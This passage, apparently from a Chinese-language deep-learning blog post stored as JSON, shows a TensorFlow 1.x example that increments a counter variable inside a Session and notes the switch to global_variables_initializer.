tf\n\n# 创建一个变量, 初始化为标量 0.\nstate = tf.Variable(0, name=\"counter\")\n\n# 创建一个 op, 其作用是使 state 增加 1\none = tf.constant(1)\nnew_value = tf.add(state, one)\nupdate = tf.assign(state, new_value)\n\n# 启动图后, 变量必须先经过`初始化` (init) op 初始化,\n# 首先必须增加一个`初始化` op 到图中.\n# initialize_all_variables 警告换成 global_variables_initializer\ninit_op = tf.global_variables_initializer()\n\n# 启动图, 运行 op\nwith tf.Session() as sess:\n    # 运行 'init' op\n    sess.run(init_op)\n    # 打印 'state' 的初始值\n    print(sess.run(state))\n    # 运行 op, 更新 'state', 并打印 'state'\n    for i in range(3):\n        sess.run(update)\n        print(sess.run(state))\n```\n\n运行成功则正常。\n\n开启旅程啦~~\n","tags":["深度学习"],"categories":["深度学习"]}]